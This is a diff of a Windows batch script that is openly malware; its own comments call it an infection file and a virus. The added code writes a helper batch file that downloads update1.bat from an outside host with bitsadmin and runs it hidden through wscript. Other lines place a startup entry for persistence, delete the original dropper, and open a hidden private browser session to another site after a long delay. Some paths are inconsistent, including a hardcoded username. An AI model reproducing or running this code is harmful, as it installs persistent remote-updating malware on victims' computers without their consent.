@@ -150,6 +150,19 @@ ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+
+REM if the update is downloaded its copied somewhere where this can check it update1 has been installed. May not be necessary.
+ECHO ping -n 10 127.0.0.1 >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO IF EXIST "C:\Users\Popeye\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO    copy /y "C:\Users\%username%\Downloads\update1.bat" "C:\Users\%username%\AppData\Microsoft" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO    ping -n 1 127.0.0.1 >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO    wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\update1.bat >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ELSE( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ECHO nothing >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+
+
 REM Wait 17 mins, then launch internet. 
 ECHO ping -n 1020 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start /min iexplore -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
@@ -175,7 +188,7 @@ copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" "C:\Users\%username%\AppData
 copy /y "C:\Users\%username%\Downloads\mute.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
 copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Roaming"
 copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local"
-copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 
 REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
@@ -188,8 +201,15 @@ del C:\Users\%username%\Downloads\startup_copier2.bat
 
 
 
+wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\startup_copier2.bat
+wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat
+
 REM Deletes original infection file.
+
 del update0.bat
+
+
+
 
 
 REM Taskkill cmd.exe used at somepoint after the update. regular virus will auto run after next computer restart. This is only for updating.
